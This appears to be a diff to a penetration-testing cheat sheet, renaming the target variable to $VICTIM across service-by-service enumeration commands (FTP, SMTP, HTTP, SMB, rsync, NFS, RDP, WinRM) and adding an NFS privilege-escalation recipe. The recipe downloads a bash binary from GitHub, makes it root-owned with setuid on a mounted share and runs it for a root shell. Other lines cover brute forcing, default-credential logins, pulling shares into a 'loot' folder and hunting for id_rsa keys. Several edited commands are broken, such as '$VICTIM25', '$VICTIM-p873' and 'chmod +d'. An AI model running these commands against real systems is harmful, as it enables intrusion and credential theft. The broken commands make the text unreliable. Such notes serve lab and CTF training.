@@ -11,7 +11,7 @@ TCP port 21
 Login (try using anonymous:anonymous, anonymous:password, guest:guest, etc.).
 
 ```
-ftp $TARGET 21
+ftp $VICTIM 21
 ```
 
 List files.
@@ -23,7 +23,7 @@ ls
 List files (using Curl).
 
 ```
-curl ftp://anonymous:anonymous@$TARGET:21
+curl ftp://anonymous:anonymous@$VICTIM:21
 ```
 
 Change to Binary mode & passive (an important setting if you're uploading/downloading binary files like pictures and/or executables!).
@@ -48,7 +48,7 @@ mget *
 Download all files to the current directory (using Wget).
 
 ```
-wget -m ftp://anonymous:anonymous@$TARGET:21 -nd
+wget -m ftp://anonymous:anonymous@$VICTIM:21 -nd
 ```
 
 Upload a file.
@@ -76,26 +76,26 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
 TCP port 25.
 
 ```
-telnet $TARGET 25
+telnet $VICTIM25
 HELO
 VRFY root
 QUIT
 ```
 
 ```
-sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$TARGET-nmap-scripts-smtp-commands
+sudo nmap $VICTIM -p25 --script smtp-commands -oN scans/$VICTIM-nmap-scripts-smtp-commands
 ```
 
 ```
-sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$TARGET-nmap-scripts-smtp-enum-users
+sudo nmap $VICTIM -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$VICTIM -nmap-scripts-smtp-enum-users
 ```
 
 ```
-smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $VICTIM
 ```
 
 ```
-sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
+sudo nmap $VICTIM -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
 ```
 
 ### **HTTP(s)**
@@ -105,13 +105,13 @@ HTTP TCP port 80 / HTTP TCP 443
 Add things from this room: [https://tryhackme.com/room/contentdiscovery](https://tryhackme.com/room/contentdiscovery)
 
 ```
-dirb http://$TARGET
-dirb http://$TARGET:$PORT/ -o scans/$TARGET-dirb-$PORT-common
-dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
+dirb http://$VICTIM
+dirb http://$VICTIM:$PORT/ -o scans/$VICTIM-dirb-$PORT-common
+dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
 ```
 
 ```
-dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
+dirsearch -u $VICTIM:$PORT -o $FULLPATH/$NAME-dirsearch-80
 ```
 
 Nikto Tuning (-T) Options
@@ -136,26 +136,26 @@ x – Reverse Tuning Options (i.e., include all except specified)
 Scan for misconfigurations.
 
 ```
-nikto -h $TARGET -T 2 -Format txt -o scans/$TARGET-nikto-80-misconfig
+nikto -h $VICTIM -T 2 -Format txt -o scans/$VICTIM-nikto-80-misconfig
 ```
 
 Scan for SQL injection vulnerabilities.
 
 ```
-nikto -h $TARGET -T 9 -Format txt -o scans/$TARGET-nikto-80-sqli
+nikto -h $VICTIM -T 9 -Format txt -o scans/$VICTIM-nikto-80-sqli
 ```
 
 Check if the target is vulnerable to Shellshock
 
 ```
-sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$TARGET-nmap-scripts-80-http-shellshock
+sudo nmap $VICTIM -p80 --script http-shellshock -oN scans/$VICTIM-nmap-scripts-80-http-shellshock
 ```
 
 Check if these files exist to gather info
 
 ```
-$TARGET/robots.txt
-$TARGET/sitemap.xml
+http://$VICTIM/robots.txt
+http://$VICTIM/sitemap.xml
 ```
 
 #### &#x20;Username Enumeration
@@ -179,7 +179,7 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 TCP port 110
 
 ```
-telnet $TARGET 110
+telnet $VICTIM 110
 USER root
 PASS root
 RETR 1
@@ -191,7 +191,7 @@ QUIT
 TCP port 135
 
 ```
-rpcclient -U '' $TARGET
+rpcclient -U '' $VICTIM
 srvinfo
 netshareenum # print the real file-path of shares; good for accurate RCE
 ```
@@ -201,7 +201,7 @@ netshareenum # print the real file-path of shares; good for accurate RCE
 TCP port 139
 
 ```
-nbtscan $TARGET
+nbtscan $VICTIM
 ```
 
 ### **SMB**
@@ -209,15 +209,15 @@ nbtscan $TARGET
 TCP port 445
 
 ```
-smbclient -L //$TARGET/ # list shares
-smbclient -L //$TARGET/ -p $PORT # specify non-standard SMB/Samba port
+smbclient -L //$VICTIM/ # list shares
+smbclient -L //$VICTIM/ -p $PORT # specify non-standard SMB/Samba port
 
 ```
 
 Download files with smbclient
 
 <pre><code><strong>cd loot
-</strong>smbclient \\\\$TARGET\\$SHARE
+</strong>smbclient \\\\$VICTIM\\$SHARE
 prompt
 mget *
 </code></pre>
@@ -225,27 +225,27 @@ mget *
 The SMB shares discovered have the following permissions.
 
 ```
-smbmap -H $TARGET
-smbmap -H $TARGET -P $PORT
+smbmap -H $VICTIM
+smbmap -H $VICTIM-P $PORT
 ```
 
 Download files with smbget
 
 ```
-smbget -R smb://$TARGET/$SHARE
-smbget -R smb://$TARGET:$PORT/$SHARE
+smbget -R smb://$VICTIM/$SHARE
+smbget -R smb://$VICTIM:$PORT/$SHARE
 ```
 
 
 
 ```
 # check if vulnerable to EternalBlue
-sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010
+sudo nmap $VICTIM -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010
 ```
 
 ```
 # check if vulnerable to SambaCry
-sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
+sudo nmap $VICTIM -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
 ```
 
 ### **Rsync**
@@ -253,25 +253,47 @@ sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-c
 TCP port 873
 
 ```
-sudo nmap $TARGET -p873 --script rsync-list-modules
-rsync -av rsync://$TARGET/$SHARE --list-only
-rsync -av rsync://$TARGET/$SHARE loot
+sudo nmap $VICTIM-p873 --script rsync-list-modules
+rsync -av rsync://$VICTIM/$SHARE --list-only
+rsync -av rsync://$VICTIM/$SHARE loot
 ```
 
 ### **NFS**
 
 TCP port 2049
 
+<pre><code><strong>sudo nmap $VICTIM-p111 --script-nfs*
+</strong>showmount -e $VICTIM
+</code></pre>
+
+**Create mount**
+
 ```
-sudo nmap $TARGET -p111 --script-nfs*
-showmount -e $TARGET
-
 sudo mkdir /mnt/FOO
-sudo mount //$TARGET:/$SHARE /mnt/FOO
+mount -t nfs $VICTIM:$SHARE /tmp/mount/ -nolock
+sudo mount //$VICTIM:/$SHARE /mnt/FOO
+```
 
-sudo adduser demo
-sudo sed -i -e 's/1001/5050/g' /etc/passwd
-cat /mnt/FOO/loot.txt
+**Interesting loot to look for**
+
+<pre><code><strong>- id_rsa from users home directories
+</strong></code></pre>
+
+**Privilege Escalation**
+
+Example of how you can get root shell. All commands except the last one are run on our Kali machine where we can control the permissions fully. Then we just run the exploit as the normal user we already have access to.
+
+```
+#Download exploit
+wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
+
+mv bash /mount/point
+chown root /mount/point/bash
+chmod +u /mount/point/bash
+chmod +d /mount/point/bash
+
+#SSH in as victim and run the following
+/mount/point/bash -p
 ```
 
 ### **SQL**
@@ -279,7 +301,7 @@ cat /mnt/FOO/loot.txt
 TCP port 3306
 
 ```
-mysql -u $USER -h $TARGET
+mysql -u $USER -h $VICTIM
 ```
 
 ### **RDP**
@@ -287,11 +309,11 @@ mysql -u $USER -h $TARGET
 TCP port 3389
 
 ```
-sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
+sudo nmap $VICTIM -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
 ```
 
 ```
-rdesktop -u administrator $TARGET
+rdesktop -u administrator $VICTIM
 ```
 
 ### **Postgres**
@@ -299,7 +321,7 @@ rdesktop -u administrator $TARGET
 TCP port 5437
 
 ```
-psql -U postgres -p 5437 -h $TARGET # postgres:postgres
+psql -U postgres -p 5437 -h $VICTIM # postgres:postgres
 SELECT pg_ls_dir('/');
 ```
 
@@ -308,7 +330,7 @@ SELECT pg_ls_dir('/');
 TCP port 5985
 
 ```
-evil-winrm -u $USER -p $PASSWORD -i $TARGET
+evil-winrm -u $USER -p $PASSWORD -i $VICTIM
 ```
 
 ### **IRC**
@@ -316,7 +338,7 @@ evil-winrm -u $USER -p $PASSWORD -i $TARGET
 TCP port 6667
 
 ```
-irssi -c $TARGET -p $PORT
+irssi -c $VICTIM -p $PORT
 ```
 
 ####
